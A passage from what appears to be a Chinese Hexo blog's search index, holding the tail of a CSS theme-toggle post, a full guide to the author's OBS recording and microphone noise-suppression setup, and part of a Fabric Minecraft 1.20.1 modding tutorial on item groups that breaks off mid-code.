bindRippleThemeToggle)</span><br><span class="line">);</span><br></pre></td></tr></tbody></table></figure><h2 id="注入css"><a class="markdownIt-Anchor" href="#注入css"></a> 注入 css</h2><p>注入步骤同上，我的 <code>ripple-toggle.css</code> 代码如下：</p><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">::<span class="built_in">view-transition-new</span>(root),</span><br><span class="line">::<span class="built_in">view-transition-old</span>(root) {</span><br><span class="line">  <span class="attribute">animation</span>: none;</span><br><span class="line">  <span class="attribute">mix-blend-mode</span>: normal;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">html</span><span class="selector-attr">[data-theme=<span class="string">"dark"</span>]</span>::<span class="built_in">view-transition-old</span>(root) {</span><br><span class="line">  <span class="attribute">z-index</span>: <span class="number">100</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> API </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的 OBS 方案</title>
      <link href="/posts/36838.html"/>
      <url>/posts/36838.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><meta name="referrer" content="no-referrer"><blockquote><p>平台：Windows11 pro 23H2<br>OBS 版本：31.0.3 (64bit)<br><code>OBS</code> 全称为 <code>Open Broadcaster Software</code>，以下简称为 <code>OBS</code>。<br>它是一个开源免费的视频录制和直播软件，您可以在 Windows、Mac 或 Linux 上快速轻松地下载并开始直播或是录制视频。</p></blockquote><h2 id="安装"><a class="markdownIt-Anchor" href="#安装"></a> 安装</h2><p>官网下载地址：<a href="https://obsproject.com/download">https://obsproject.com/download</a></p><p>你也可以使用 Steam 安装，商店地址为：<a href="https://store.steampowered.com/app/1905180/OBS_Studio/">https://store.steampowered.com/app/1905180/OBS_Studio/</a></p><h2 id="录制视频方案"><a class="markdownIt-Anchor" href="#录制视频方案"></a> 录制视频方案</h2><p>由于我暂时还在使用 1k 显示器，所以对于传统的 <code>1920x1080</code> 分辨率，我新建配置文件并命名为 <code>16:9录制</code>。</p><p>在此场景源中新增三个采集源，即游戏采集、窗口采集、显示器采集；混音器新增麦克风采集。</p><p>点击左上角文件转到设置界面，左侧边栏选择<strong>输出</strong>，并将<strong>输出模式</strong>改为<strong>高级</strong>。现在，你将可以设置四个项目：</p><ol><li>直播</li><li>录制</li><li>音频</li><li>回放缓存</li></ol><p>直播的画质设置基本同录制视频一致，所以此处将介绍<strong>录制</strong>项目的具体配置。</p><h3 id="录制"><a class="markdownIt-Anchor" href="#录制"></a> 录制</h3><p>在录制选项中，将类型改为<strong>标准</strong>，并以下图为参考进行设置：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181239464.png" alt="image-20250718123921347"></p><p><strong>录像格式</strong>，推荐采用 <code>Matroska(.mkv)</code> 格式，此格式录制的视频在突然断电或者其他问题导致录制视频受损时可以被抢救。</p><blockquote><p>另，如果你想将视频发送给朋友进行分享，朋友的视频播放器可能会不支持<code>.mkv</code> 解析，那么你只需要利用 OBS 自带的<code>录像转封装</code>功能 (点击左上角的文件 =&gt; 录像装封装)，将<code>.mkv</code> 转换成<code>.mp4</code> 就好（导入 Pr 进行视频剪辑同样需要转封装为<code>.mp4</code>）。<br>转换封装（只转换封装不进行转码）一般不会损害画面信息，因为只是转换了视频容器，这个过程就像是将物品从一个盒子放到另一个盒子一样非常快；而转码则是指<strong>重新压缩和编码视频内容</strong>，例如将 H.264 编码的视频转为 H.265。这相当于 “重新包装物品”，不仅改变外壳，还会对内部内容进行处理。<br>如果你只想进行视频剪辑而不需要转码（Pr 导出视频往往会将视频重新转码），推荐使用免费的 <a href="https://www.shutterencoder.com/">Shutter Encoder</a>：<a href="https://www.shutterencoder.com/">Shutter Encoder</a> 是一款 <strong>免费、开源、专业级的视频处理工具</strong>，由法国剪辑师 Paul Pacifico 开发。它界面简洁，功能强大，适用于 <strong>视频封装转换、剪辑、压缩、格式转换、音频提取</strong> 等多种操作，非常适合创作者在<strong>不进行转码</strong>的情况下快速处理素材。</p></blockquote><p><strong>视频编码器</strong>，推荐选择 <code>NVIDIA NVENC H.264</code>，这将优先使用显卡进行视频编码，并且格式为兼容性极高的 <code>H.264</code>。相对的，会有一个 <code>x264</code> 选项，此为 CPU 编码，若显卡功能足够，则不推荐选择。</p><p><strong>音轨</strong>，推荐勾选 <code>1、2、3</code> 音轨，用以支持麦克风、电脑音频分开录制，方便后期处理。多出来的一条轨道是用来将两个音频混在一起，这对预览视频帮助很大，你也不想预览视频的时候只能一条条轨道切换着听吧？</p><p><strong>重新缩放</strong>输出为禁用；<strong>自定义混流器</strong>设置一般不用，留空；<strong>自动分割文件</strong>，看个人喜好。</p><p><strong>比特率控制</strong>，我推荐为 <code>CBR</code>。</p><blockquote><p><strong>比特率俗称码率，值越高视频承载的画面信息往往越多</strong>。</p></blockquote><p>此处的控制方式（根据选择的视频编码器的不同，此处比特率控制的选项也有不同，推荐选择的视频编码器为 <code>NVIDIA NVENC H.264</code>）有：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181257062.png" alt="image-20250718125704031"></p><ol><li><strong>恒定比特率（CBR）</strong>：顾名思义，录制视频时，<strong>比特率将始终保持在设定的值上</strong>（理想情况下），即使画面很简单也不会降低码率。虽便于直播，但简单画面也会占用同样的码率，如果录制的画面较为简单，请降低比特率的值，比如 4000 左右（你可以将 4000 码率简单的理解为直播平台的蓝光 4M）。</li><li><strong>恒定（QP）</strong>：采用 QP（Quantization Parameter）将会让你设定 QP 的值，该值控制的是压缩强度。<strong>值越低，画质越好，但文件也越大；数值越高，画质越差，文件越小</strong>。<strong>视频质量在全程保持一致</strong>，而文件大小（码率）会根据内容复杂度波动。这也使得你无法预估它产生的文件大小，不适合直播。若硬盘容量不足，请谨慎使用。</li><li><strong>可变比特率（VBR）</strong>：采用此项，将会让你设定<strong>目标比特率值</strong>和<strong>最大比特率值</strong>。录制视频时，比特率将视当前采集画面的内容复杂度来决定比特率的值的高低。即画面越复杂，比特率越高；画面越简单，比特率越低（但一般不会低于所设定的目标比特率值）。这样录制出来的视频体积较小，但复杂画面情况下，可能会因为码率分配不足导致画质变差。</li><li><strong>具有目标质量的可变比特率（CQVBR）</strong>：编码器采用 <code>NVIDIA NVENC H.264</code> 则此处算法为 <code>CQ</code>，若选择的视频编码器为 CPU 编码的 <code>x264</code>，则此处算法为 <code>CRF</code>。采用此项，将会让你设定目标质量的值，这是<strong>基于画质优先的可变比特率</strong>，与 VBR 不同，它设定的是 “画质等级”，而不是码率。编码器将自动调整码率以保持目标画质。常见数值（如 NVENC CQ = 15-25，x264 CRF = 18-23），数值越小画质越高。同样的，这样的录制方式，文件大小不可控，不适合直播。</li><li><strong>无损</strong>：保留原汁原味的画面信息，不对画面使用任何有损压缩方法。但产生的文件极大，不适合直播。</li></ol><p>至于比特率下面的预设内容，需要根据你的显卡能力决定，我的显卡为 <code>RTX 4070</code> 仅供参考。</p><h3 id="画布"><a class="markdownIt-Anchor" href="#画布"></a> 画布</h3><p>画布的大小决定了最终的视频分辨率。此项，在设置的左侧边栏的视频中，设置时请注意基础画布和输出的差别即可：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181341742.png" alt="image-20250718134153700"></p><p>基础画布分辨率往往是你的显示器分辨率，而输出分辨率则决定了录制的视频最终效果，比如 2k 显示器录制 1k 内容，则需要将输出分辨率进行更改，并且选择缩小算法为 <code>Lanczos（锐化缩放，36个样本）</code>。</p><p>帧率就是视频的帧率啦，这很简单。</p><h3 id="高级"><a class="markdownIt-Anchor" href="#高级"></a> 高级</h3><p>在左侧边栏的高级选项中，你可能还需要确认一下视频的相关信息：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181345779.png" alt="image-20250718134519745"></p><p><strong>色彩格式</strong>，因为视频可能需要上传到网络平台，所以出于兼容性的考虑，推荐选择 <code>NV12（8位）</code>。<strong>色彩空间</strong>也是同理，当然你也可以选择为 <code>SRGB</code>，这和 <code>Rec.709</code> 相差很小，往往能转换。</p><p>特别的，如果你觉得每次都要手动转换封装很烦，那么也可以勾选上录制里面的<strong>自动封装至 mp4 格式</strong>。</p><h2 id="混音器"><a class="markdownIt-Anchor" href="#混音器"></a> 混音器</h2><p>前面我们设置了视频的音轨为 3 轨道，所以还需要在混音器中将 3 轨道勾选上：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181351792.png" alt="image-20250718135136741"></p><p>找到一个音频表，点击选项图标再找到高级音频设置即可。按如图所示将轨道勾选，音轨 1 为混音轨道，麦克风和电脑音频将一起输出在这个轨道，这之后轨道 2 和轨道 3 分别勾选好就行，麦克风和电脑音频独占一条轨道。</p><h2 id="麦克风降噪"><a class="markdownIt-Anchor" href="#麦克风降噪"></a> 麦克风降噪</h2><p>由于我暂时使用的是电容式麦克风，往往会收音到环境噪音，所以给麦克风进行降噪是必须的。</p><p>我的方案是：<code>Equalizer APO</code>+<code>Real-time Noise Suppression Plugin</code></p><h3 id="noise-suppression"><a class="markdownIt-Anchor" href="#noise-suppression"></a> Noise Suppression</h3><p>下载地址：<a href="https://github.com/werman/noise-suppression-for-voice/releases">Noise Suppression GitHub Releases</a></p><blockquote><p>A real-time noise suppression plugin for voice based on <a href="https://github.com/xiph/rnnoise">Xiph's RNNoise</a>. <a href="https://people.xiph.org/~jm/demo/rnnoise/">More info about the base library</a>.<br>基于 Xiph's RNNoise 的实时语音降噪插件。有关基础库的更多信息。</p><p>The plugin is meant to suppress a wide range of noise origins (<a href="https://arxiv.org/pdf/1709.08243.pdf">from original paper</a>): computer fans, office, crowd, airplane, car, train, construction.<br>该插件旨在抑制多种噪声来源（根据原始论文）：电脑风扇、办公室、人群、飞机、汽车、火车、建筑工地。</p><p>From my tests mild background noise is always suppressed, loud sounds, like clicking of mechanical keyboard, are suppressed while there is no voice however they are only reduced in volume when voice is present.<br>根据我的测试，轻微的背景噪声总是会被抑制，而像机械键盘点击声这样的大声响，在无语音时会被抑制，但有语音时只会降低音量。</p><p>Please note that this plugin could not improve the voice quality with bad microphone, it even could make things worse by misclassifying the voice as a noise which would reduce already not-so-good voice quality.<br>请注意，该插件无法改善劣质麦克风的语音质量，甚至可能通过将语音误分类为噪声而使情况变得更糟，从而降低已经不算好的语音质量。</p><p>The plugin works with one or more channels, 16 bit, 48000 Hz audio input.<br>该插件适用于一个或多个通道、16 位、48000 赫兹的音频输入。</p><p>❗ ❗ ❗ Do NOT use any other sample rates, use ONLY 48000 Hz, make sure your audio source is 48000 Hz and force it to be 48000 Hz if it is not.<br>❗ ❗ ❗ 请勿使用任何其他采样率，仅使用 48000 Hz，确保您的音频源为 48000 Hz，如果不是，强制将其设置为 48000 Hz。</p></blockquote><p>你需要下载该插件保存到本地备用。</p><h3 id="equalizer-apo"><a class="markdownIt-Anchor" href="#equalizer-apo"></a> Equalizer APO</h3><blockquote><p>参考视频：<a href="https://www.bilibili.com/video/BV1e84y1R7un">你是否也遇到了麦克风声音小底噪大的问题</a></p></blockquote><p>下载地址：<a href="https://sourceforge.net/projects/equalizerapo/">SourceForge</a> 或者 <a href="https://equalizerapo.com/download.html">https://equalizerapo.com/download.html</a></p><blockquote><p><strong>SourceForge</strong>：<strong>Equalizer APO</strong> 是一款运行在 Windows（Vista 及以上版本）的系统级音频处理框架，采用 <strong>Audio Processing Object (APO)</strong> 架构。它可以对任意音频输出进行实时均衡、增强、应用音频效果，具有极低延迟和系统资源占用（CPU 占用率很低）</p></blockquote><p>安装时，会有一个这样的界面：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181437636.png" alt="image-20250718142405779"></p><p>也就是默认在安装时就进行安装 APO，你也可以点击 Cancel 取消安装，也可以在此时就进行安装。如果现在进行安装，那么由于我们是给麦克风降噪，所以这里选择 <code>Capture devices</code> 而<strong>不是</strong><code>Playback devices</code>，再勾选你想进行降噪的麦克风即可。之后一路下一步完成安装。</p><p>这个软件是需要进行一定配置的。不过，首先我们需要转到系统设置中，对播放、录制设备进行格式统一：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181419088.png" alt="image-20250718141948034"></p><p>把播放、录制设备的格式参数都统一成 <strong>24 位 48000 HZ</strong> 这个参数。</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181421889.png" alt="image-20250718142147852"></p><p><strong>别忘记保存你的设置。</strong></p><p>接着打开 <code>Equalizer APO Configuration Editor</code>（在软件安装目录中是 <code>Editor.exe</code>），会弹出一个对话框：</p><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181416876.png" alt="image-20250718141640846"></p><p>这是正常的，如果你前面在安装时没有安装 APO，这里就会弹出来这个对话框（有时候安装好了也会弹，不知道为啥）。对话框表示你现在没有在任何播放、录制设备上安装 APO。<br>如果你前面没有进行安装，那么我们点击 Yes，开始安装 APO 到设备上，安装步骤和前面一致（可能需要重启电脑）。</p><p>已经安装过了，所以我们选择 No。接着在工具栏中选择你的设备为你想要的麦克风：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181440995.png" alt="image-20250718144024925"></p><p>接着将 <code>config.txt</code> 中的默认配置点击减号 <code>-</code> 全部去掉：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181442503.png" alt="image-20250718144205459"></p><p>接着点击工具栏中的空白文档图标，创建一个新的配置文件：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181443772.png" alt="image-20250718144348736"></p><p>然后在这个 Unsaved 新的配置文件中点击加号 <code>+</code>，选择 <code>Control</code>，再选择 Device：<img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181446086.png" alt="image-20250718144638045"></p><p>接着将设备改为你需要进行降噪的麦克风：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181449734.png" alt="image-20250718144904697"></p><p>接着再点击加号选择 <code>Plugins</code> 选择 <code>VST Plugin</code><br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181452724.png" alt="image-20250718145259692"></p><p>此时，加载 <code>rnnoise_mono.dll</code> 还是 <code>rnnoise_stereo.dll</code> 就看 Channel 是怎么选的了：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181455234.png" alt="image-20250718145516198"></p><p>加载好插件之后，特别的，你可以点击 <code>Open panel</code> 打开该插件的设置面板：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181456173.png" alt="image-20250718145650131"></p><p>我的设置如上。</p><p>接着需要将配置文件进行保存。点击工具栏的 Save 图标为配置文件命名进行保存：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181458964.png" alt="image-20250718145836927"></p><p>然后回到 <code>config.txt</code> 配置文件，对我们刚才保存的配置文件进行包含：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181459361.png" alt="image-20250718145959329"><br>得到下面的样子：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181500554.png" alt="image-20250718150026514"></p><p>至此，该软件就配置完成了。这个效果是全局生效的，即使你关闭该软件依然会生效。</p><h3 id="obs-滤镜"><a class="markdownIt-Anchor" href="#obs-滤镜"></a> OBS 滤镜</h3><blockquote><p>参考视频：<a href="https://www.bilibili.com/video/BV16vZNYqEot">【OBS 教程】添加 8 个音频滤镜 让声音清晰洪亮</a></p></blockquote><p>我知道你肯定想问，如果 OBS 能添加 VST 插件，那为什么还需要使用 <code>Equalizer APO</code> 呢？确实，但这只是生效于 OBS 录制的麦克风中，但其他软件的视频通话、语音时并不会生效，使用 <code>Equalizer APO</code> 就是图它这个全局效果。</p><p>承接上面的配置完成之后，在混音器中点击麦克风的设置菜单，选择滤镜。添加滤镜如图：<br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181356550.png" alt="image-20250718135628505" style="zoom: 33%;"><br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181514694.png" alt="image-20250718151453650" style="zoom:33%;"><br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181515605.png" alt="image-20250718151507551" style="zoom:33%;"><br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181515109.png" alt="image-20250718151520061" style="zoom:33%;"><br><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507181515385.png" alt="image-20250718151533326" style="zoom:33%;"></p><div class="note warning flat"><p><strong>OBS 滤镜的执行是有顺序的，请注意，滤镜将会从上到下依次执行。</strong></p></div><p>其中，各个滤镜的作用是：</p><ol><li><strong>噪声门限</strong>：用于隔绝低于关闭阈值的声音，只收音到打开阈值的声音分贝。此项主要是处理键盘声和其他细微的声音。</li><li><strong>向上压缩器</strong>：用于提升小声说话时的声音分贝值，将小声说话时的分贝值拉升到平常说话分贝值。所以，此项需要在噪声门限的下面一级，否则将会把环境噪音也拉升。</li><li><strong>3 段式均衡器</strong>：用于调整声音频段分贝。压低高频分贝，将有效降低声音空间感；压低中频分贝，将降低声音的鼻音不会很闷；压低低频分贝，将一定程度上使声音变得很轻。</li><li><strong>压缩器</strong>：防止一瞬间录到的声音爆麦，将音频进行消音，处理较为平滑。</li><li><strong>限幅</strong>：和压缩器作用一致，但更强硬。</li></ol><p>至此，我的全部设置基本讲解完毕。</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 我的方案 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OBS </tag>
            
            <tag> VST </tag>
            
            <tag> Noise Suppression </tag>
            
            <tag> Equalizer APO </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fabric 模组开发 - Minecraft1.20.1：#3. 创造模式物品组</title>
      <link href="/posts/36729.html"/>
      <url>/posts/36729.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/hint.css/2.7.0/hint.min.css"><h2 id="物品组"><a class="markdownIt-Anchor" href="#物品组"></a> 物品组</h2><p>前面我们成功向 MC 中添加了一个 Mod 物品，但是，它不像原版物品，还不存在于任何物品组中，你不能在创造模式轻易获取！有两种方式实现：</p><ul><li>将物品添加到已存在的物品组</li><li>创建你自己的物品组并添加物品</li></ul><p>不论是哪种，添加到任何物品组的物品都可以在创造模式物品栏中搜索到。</p><h2 id="添加到已存在的物品组"><a class="markdownIt-Anchor" href="#添加到已存在的物品组"></a> 添加到已存在的物品组</h2><p>首先，我们需要决定要添加到哪个物品组。那我怎么知道 MC 有哪几个物品组呢？我们可以通过查看源码来确定。双击 <code>shift</code> 唤出搜索面板，搜索 <code>ItemGroups</code> 类（搜索位置为所有位置，以后将不再赘述）：<br><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202507271044181.png" alt="image-20250727104440097"></p><p>这第一个来源为 <code>net.minecraft.item</code> 的（查看源码都是基于来源 minecraft，以后将不再赘述）就是我们需要查看的源码了：<br><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202507271046212.png" alt="image-20250727104651148"></p><p>对照表如下：</p><table><thead><tr><th>物品组</th><th>译</th></tr></thead><tbody><tr><td> BUILDING_BLOCKS</td><td> 建筑方块</td></tr><tr><td> COLORED_BLOCKS</td><td> 染色方块</td></tr><tr><td> NATURAL</td><td> 自然方块</td></tr><tr><td> FUNCTIONAL</td><td> 功能方块</td></tr><tr><td> REDSTONE</td><td> 红石方块</td></tr><tr><td> HOTBAR</td><td> 已保存的快捷栏</td></tr><tr><td> SEARCH</td><td> 搜索物品</td></tr><tr><td> TOOLS</td><td> 工具与实用物品</td></tr><tr><td> COMBAT</td><td> 战斗用品</td></tr><tr><td> FOOD_AND_DRINK</td><td> 食物与饮品</td></tr><tr><td> INGREDIENTS</td><td> 原材料</td></tr><tr><td> SPAWN_EGGS</td><td> 刷怪蛋</td></tr><tr><td> OPERATOR</td><td> 管理员物品</td></tr><tr><td> INVENTORY</td><td> 生存模式物品栏</td></tr></tbody></table><blockquote><p>原版总共 14 种物品组。其中，<code>OPERATOR</code> 在按键控制中的<code>管理员用品标签页</code>设置启用。</p></blockquote><p>知道物品组之后，我们尝试将前面创建的紫色粉末和蓝色粉末加到 <code>INGREDIENTS</code> 原材料物品组中。</p><p>参考 Fabric 提供的 API（底层是 Mixin），我们使用 <code>ItemGroupEvents.modifyEntriesEvent</code> 为修改物品组创建事件处理器（<code>ModItems.java</code>）：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加物品到原有的物品组中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerToVanillaItemGroups</span><span class="params">()</span> {</span><br><span class="line">    ItemGroupEvents.modifyEntriesEvent(ItemGroups.INGREDIENTS).register(content -&gt; {</span><br><span class="line">        content.add(PURPLE_POWDER);</span><br><span class="line">        content.add(BLUE_POWDER);</span><br><span class="line">    });</span><br><span class="line">    TutorialMod.LOGGER.info(<span class="string">"fk-ItemGroups: items registered to vanilla item groups"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerItems</span><span class="params">()</span> {</span><br><span class="line">    registerToVanillaItemGroups();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>别忘记在主类 <code>TutorialMod.java</code> 中，在 <code>onInitialize()</code> 对 <code>registerItems()</code> 进行调用。效果如下：<br><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202507271117812.png" alt="image-20250727111725765"></p><p>如果觉得默认添加到物品组的底部比较麻烦，也可以精细化地控制添加位置。比如，将蓝色粉末加在原材料物品组的木炭后面：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加物品到原有的物品组中</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerToVanillaItemGroups</span><span class="params">()</span> {</span><br><span class="line">    ItemGroupEvents.modifyEntriesEvent(ItemGroups.INGREDIENTS).register(content -&gt; {</span><br><span class="line">        content.add(PURPLE_POWDER);</span><br><span class="line">        content.addAfter(Items.CHARCOAL, BLUE_POWDER); <span class="comment">// 将蓝色粉末加在木炭之后</span></span><br><span class="line">    });</span><br><span class="line">    TutorialMod.LOGGER.info(<span class="string">"fk-ItemGroups: items registered to vanilla item groups"</span>);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>效果如下：<br><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202507271122542.png" alt="image-20250727112240461"></p><h2 id="创建自定义物品组"><a class="markdownIt-Anchor" href="#创建自定义物品组"></a> 创建自定义物品组</h2><p>创建自定义的物品组会被放置在单独的标签页中，这是一般 Mod 都会做的操作。</p><h3 id="写法一使用fabric-api"><a class="markdownIt-Anchor" href="#写法一使用fabric-api"></a> 写法一（使用 Fabric API）</h3><p>在 <code>java/com/frozen/tutorialmod/item/</code> 中，创建 <code>ModItemGroups.java</code> 类。</p><p>参考 Fabric 提供的 api，我们使用 <code>FabricItemGroup.builder</code> 方法来创建物品组的构建器，并调用 <code>build</code> 方法完成构建（<code>ModItemGroups.java</code>）：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ModItemGroups</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ItemGroup</span> <span class="variable">TUTORIAL_GROUP</span> <span class="operator">=</span> FabricItemGroup.builder()</span><br><span class="line">            .icon(() -&gt; <span class="keyword">new</span> <span class="title class_">ItemStack</span>(ModItems.BLUE_POWDER)) <span class="comment">// 标签页图标</span></span><br><span class="line">            .displayName(Text.translatable(<span class="string">"itemGroup.tutorial-mod.tutorial_group"</span>)) <span class="comment">// 必须显式指定显示名称，否则会报错</span></span><br><span class="line">            .entries((context, entries) -&gt; {</span><br><span class="line">                entries.add(ModItems.BLUE_POWDER);</span><br><span class="line">                entries.add(ModItems.PURPLE_POWDER);</span><br><span class="line">            }).build();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>紧接着，完成物品组的注册：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ModItemGroups</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ItemGroup</span> <span class="variable">TUTORIAL_GROUP</span> <span class="operator">=</span> FabricItemGroup.builder()</span><br><span class="line">            .icon(() -&gt; <span class="keyword">new</span> <span class="title class_">ItemStack</span>(ModItems.BLUE_POWDER)) <span class="comment">// 标签页图标</span></span><br><span class="line">            .displayName(Text.translatable(<span class="string">"itemGroup.tutorial-mod.tutorial_group"</span>)) <span class="comment">// 必须显式指定显示名称，否则会报错</span></span><br><span class="line">            .entries((context, entries) -&gt; {</span><br><span class="line">                entries.add(ModItems.BLUE_POWDER);</span><br><span class="line">                entries.add(ModItems.PURPLE_POWDER);</span><br><span class="line">            }).build();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">registerMyItemGroups</span><span class="params">()</span> {</span><br><span class="line">        TutorialMod.LOGGER.info(<span class="string">"fk-ItemGroups: created new item group and registered items to it"</span>);</span><br><span class="line">        Registry.register(Registries.ITEM_GROUP, <span class="keyword">new</span> <span class="title class_">Identifier</span>(<span class="string">"tutorial-mod"</span>, <span class="string">"tutorial_group"</span>), TUTORIAL_GROUP);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>别忘记在主类 <code>TutorialMod.java</code> 中对 <code>registerMyItemGroups()</code> 方法进行调用。</p><h3 id="写法二原生写法"><a class="markdownIt-Anchor" href="#写法二原生写法"></a> 写法二（原生写法）</h3><p>上面的方法一是 Fabric 提供的 API 实现的物品组注册，没什么好说的，参照官方写法就行。<br>值得注意的是，这种写法，Mod 的物品组默认位置为 <code>TOP</code> 且索引为 <code>7</code>（<code>14</code> 种物品组分为上下各 <code>7</code> 组，且索引均从 <code>0</code> 开始），或者说索引为 <code>-1</code>，是不能控制物品组的位置的。</p><p>那么原生写法如何写呢？其实，在 MC 源码的 <code>ItemGroups.java</code> 中就已经写了：<br><img src="https://gitee.com/CSJ021005/new-pic-bed/raw/main/img/202507271703328.png" alt="image-20250727170323242"></p><p>第一个 <code>register</code> 方法主要是在</p><p>那么参照原生写法，我们再来写一遍 <code>ModItemGroups.java</code>：</p><figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写法二：使用Vanilla API 写法</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> RegistryKey&lt;ItemGroup&gt; TUTORIAL_GROUP = register(<span class="string">"tutorial_group"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> RegistryKey&lt;ItemGroup&gt; <span class="title function_">register</span><span class="params">(String id)</span> {</span><br><span class="line">    <span class="keyword">return</span> RegistryKey.of(RegistryKeys.ITEM_GROUP, <span class="keyword">new</span> <span class="title class_">Identifier</span>(TutorialMod.MOD_ID, id));</span><br><span class="line">}</span><br><span class="line"><span class="keyword">public</span> <span 